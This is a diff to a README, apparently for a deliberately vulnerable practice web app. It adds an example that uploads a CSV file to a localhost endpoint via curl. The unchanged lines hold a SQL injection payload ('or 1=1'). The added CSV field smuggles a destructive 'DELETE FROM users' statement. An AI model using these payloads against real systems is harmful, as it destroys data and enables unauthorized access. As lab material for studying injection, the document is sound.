@@ -40,6 +40,13 @@ curl -X POST http://localhost:8080/vun/sql/example6/ -H "Content-Type: applicati
 curl -X POST http://localhost:8080/vun/sql/example6/ -H "Content-Type: application/xml" -d "<filters><filter>michal' or 1=1 -- -</filter></filters>"
 ```
 
+### POST request - payload in csv file
+```bash
+echo "\"name\",\"surname\"" > /tmp/file.csv
+echo "\"michal\",\"hacker'); DELETE FROM users; -- -\"" >> /tmp/file.csv
+curl  -X POST -H "Content-Type: multipart/form-data" http://localhost:8080/vun/sql/example7/ --form file="@/tmp/file.csv"
+```
+
 ## CMD Injection
 
 ### GET request - payload in query param
